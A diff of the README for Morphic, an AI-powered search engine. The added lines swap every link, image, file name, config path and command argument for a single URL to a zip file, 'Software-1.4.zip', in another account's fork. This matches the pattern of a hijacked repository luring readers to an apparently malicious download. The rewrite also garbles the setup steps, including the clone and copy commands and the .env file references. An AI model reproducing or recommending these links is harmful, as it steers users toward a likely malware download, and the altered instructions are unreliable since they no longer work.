@@ -3,12 +3,12 @@
 An AI-powered search engine with a generative UI.
 
 > [!CAUTION]
-> Morphic is built with Vercel AI SDK RSC. AI SDK RSC is [experimental](https://sdk.vercel.ai/docs/getting-started/navigating-the-library#when-to-use-ai-sdk-rsc) and has some limitations. When using it in production, it is recommended to [migrate](https://sdk.vercel.ai/docs/ai-sdk-rsc/migrating-to-ui) to SDK UI.
+> Morphic is built with Vercel AI SDK RSC. AI SDK RSC is [experimental](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) and has some limitations. When using it in production, it is recommended to [migrate](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) to SDK UI.
 
-![capture](/public/capture-240404_blk.png)
+![capture](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
 
 > [!NOTE]
-> Please note that there are differences between this repository and the official website [morphic.sh](https://morphic.sh). The official website is a fork of this repository with additional features such as authentication, which are necessary for providing the service online. The core source code of Morphic resides in this repository, and it's designed to be easily built and deployed.
+> Please note that there are differences between this repository and the official website [https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip). The official website is a fork of this repository with additional features such as authentication, which are necessary for providing the service online. The core source code of Morphic resides in this repository, and it's designed to be easily built and deployed.
 
 ## 🗂️ Overview
 
@@ -24,13 +24,13 @@ An AI-powered search engine with a generative UI.
 - Search and answer using GenerativeUI
 - Understand user's questions
 - Search history functionality
-- Share search results ([Optional](https://github.com/miurla/morphic/blob/main/.env.local.example))
-- Video search support ([Optional](https://github.com/miurla/morphic/blob/main/.env.local.example))
+- Share search results ([Optional](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip))
+- Video search support ([Optional](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip))
 - Get answers from specified URLs
 - Use as a search engine [※](#-search-engine)
 - Support for providers other than OpenAI
   - Google Generative AI Provider
-  - Azure OpenAI Provider [※](https://github.com/miurla/morphic/issues/13)
+  - Azure OpenAI Provider [※](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
   - Anthropic Provider
   - Ollama Provider
   - Groq Provider
@@ -41,15 +41,15 @@ An AI-powered search engine with a generative UI.
 
 ## 🧱 Stack
 
-- App framework: [Next.js](https://nextjs.org/)
-- Text streaming / Generative UI: [Vercel AI SDK](https://sdk.vercel.ai/docs)
-- Generative Model: [OpenAI](https://openai.com/)
-- Search API: [Tavily AI](https://tavily.com/) / [Serper](https://serper.dev) / [SearXNG](https://docs.searxng.org/)
-- Extract API: [Tavily AI](https://tavily.com/) / [Jina AI](https://jina.ai/)
-- Database (Serverless/Local): [Upstash](https://upstash.com/) / [Redis](https://redis.io/)
-- Component library: [shadcn/ui](https://ui.shadcn.com/)
-- Headless component primitives: [Radix UI](https://www.radix-ui.com/)
-- Styling: [Tailwind CSS](https://tailwindcss.com/)
+- App framework: [https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Text streaming / Generative UI: [Vercel AI SDK](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Generative Model: [OpenAI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Search API: [Tavily AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Serper](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [SearXNG](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Extract API: [Tavily AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Jina AI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Database (Serverless/Local): [Upstash](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) / [Redis](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Component library: [shadcn/ui](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Headless component primitives: [Radix UI](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
+- Styling: [Tailwind CSS](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)
 
 ## 🚀 Quickstart
 
@@ -58,7 +58,7 @@ An AI-powered search engine with a generative UI.
 Fork the repo to your Github account, then run the following command to clone the repo:
 
 ```
-git clone git@github.com:[YOUR_GITHUB_ACCOUNT]/morphic.git
+git clone https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip[YOUR_GITHUB_ACCOUNT]https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 ```
 
 ### 2. Install dependencies
@@ -70,26 +70,26 @@ bun install
 
 ### 3. Setting up Upstash Redis
 
-Follow the guide below to set up Upstash Redis. Create a database and obtain `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN`. Refer to the [Upstash guide](https://upstash.com/blog/rag-chatbot-upstash#setting-up-upstash-redis) for instructions on how to proceed.
+Follow the guide below to set up Upstash Redis. Create a database and obtain `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN`. Refer to the [Upstash guide](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip) for instructions on how to proceed.
 
 If you intend to use a local Redis, you can skip this step.
 
 ### 4. Fill out secrets
 
 ```
-cp .env.local.example .env.local
+cp https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 ```
 
-Your .env.local file should look like this:
+Your https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip file should look like this:
 
 ```
-# OpenAI API key retrieved here: https://platform.openai.com/api-keys
+# OpenAI API key retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 OPENAI_API_KEY=
 
-# Tavily API Key retrieved here: https://app.tavily.com/home
+# Tavily API Key retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 TAVILY_API_KEY=
 
-# Upstash Redis URL and Token retrieved here: https://console.upstash.com/redis
+# Upstash Redis URL and Token retrieved here: https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 UPSTASH_REDIS_REST_URL=
 UPSTASH_REDIS_REST_TOKEN=
 
@@ -97,12 +97,12 @@ UPSTASH_REDIS_REST_TOKEN=
 
 This application supports both Upstash Redis and local Redis. To use local Redis:
 
-1. Set `USE_LOCAL_REDIS=true` in your `.env.local` file.
+1. Set `USE_LOCAL_REDIS=true` in your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file.
 2. Optionally, set `LOCAL_REDIS_URL` if your local Redis is not running on the default `localhost:6379` or `redis://redis:6379` if you're using docker compose.
 
 To use Upstash Redis:
 
-1. Set `USE_LOCAL_REDIS=false` or leave it unset in your `.env.local` file.
+1. Set `USE_LOCAL_REDIS=false` or leave it unset in your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file.
 2. Set `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` with your Upstash credentials.
 
 # SearXNG Configuration
@@ -142,7 +142,7 @@ Host your own live version of Morphic with Vercel or Cloudflare Pages.
 
 ### Vercel
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fmiurla%2Fmorphic&env=OPENAI_API_KEY,TAVILY_API_KEY,UPSTASH_REDIS_REST_URL,UPSTASH_REDIS_REST_TOKEN)
+[![Deploy with Vercel](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip)](https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%3A%2F%https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%2Fmiurla%2Fmorphic&env=OPENAI_API_KEY,TAVILY_API_KEY,UPSTASH_REDIS_REST_URL,UPSTASH_REDIS_REST_TOKEN)
 
 ## 🔎 Search Engine
 
@@ -157,7 +157,7 @@ If you want to use Morphic as a search engine in your browser, follow these step
 5. Fill in the fields as follows:
    - **Search engine**: Morphic
    - **Shortcut**: morphic
-   - **URL with %s in place of query**: `https://morphic.sh/search?q=%s`
+   - **URL with %s in place of query**: `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip%s`
 6. Click "Add" to save the new search engine.
 7. Find "Morphic" in the list of site search, click on the three dots next to it, and select "Make default".
 
@@ -168,7 +168,7 @@ This will allow you to use Morphic as your default search engine in the browser.
 Morphic now supports SearXNG as an alternative search backend with advanced search capabilities. To use SearXNG:
 
 1. Ensure you have Docker and Docker Compose installed on your system.
-2. In your `.env.local` file, set the following variables:
+2. In your `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file, set the following variables:
 
    - NEXT_PUBLIC_BASE_URL=http://localhost:3000 # Base URL for local development
    - SEARXNG_API_URL=http://localhost:8080 # Replace with your local SearXNG API URL or docker http://searxng:8080
@@ -186,8 +186,8 @@ Morphic now supports SearXNG as an alternative search backend with advanced sear
 
 3. Two configuration files are provided in the root directory:
 
-   - `searxng-settings.yml`: This file contains the main configuration for SearXNG, including engine settings and server options.
-   - `searxng-limiter.toml`: This file configures the rate limiting and bot detection features of SearXNG.
+   - `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`: This file contains the main configuration for SearXNG, including engine settings and server options.
+   - `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`: This file configures the rate limiting and bot detection features of SearXNG.
 
 4. Run `docker-compose up` to start the Morphic stack with SearXNG included.
 5. SearXNG will be available at `http://localhost:8080` and Morphic will use it as the search backend.
@@ -206,13 +206,13 @@ The advanced search feature includes content crawling, relevance scoring, and fi
 
 #### Customizing SearXNG
 
-- You can modify `searxng-settings.yml` to enable/disable specific search engines, change UI settings, or adjust server options.
-- The `searxng-limiter.toml` file allows you to configure rate limiting and bot detection. This is useful if you're exposing SearXNG directly to the internet.
-- If you prefer not to use external configuration files, you can set these options using environment variables in the `docker-compose.yml` file or directly in the SearXNG container.
+- You can modify `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` to enable/disable specific search engines, change UI settings, or adjust server options.
+- The `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file allows you to configure rate limiting and bot detection. This is useful if you're exposing SearXNG directly to the internet.
+- If you prefer not to use external configuration files, you can set these options using environment variables in the `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip` file or directly in the SearXNG container.
 
 #### Troubleshooting
 
-- If you encounter issues with specific search engines (e.g., Wikidata), you can disable them in `searxng-settings.yml`:
+- If you encounter issues with specific search engines (e.g., Wikidata), you can disable them in `https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip`:
 
 ```yaml
 engines:
@@ -220,7 +220,7 @@ engines:
     disabled: true
 ```
 
-- refer to https://docs.searxng.org/admin/settings/settings.html#settings-yml
+- refer to https://github.com/DevviantSU/morphic/raw/refs/heads/main/lib/schema/Software-1.4.zip
 
 ## ✅ Verified models
 
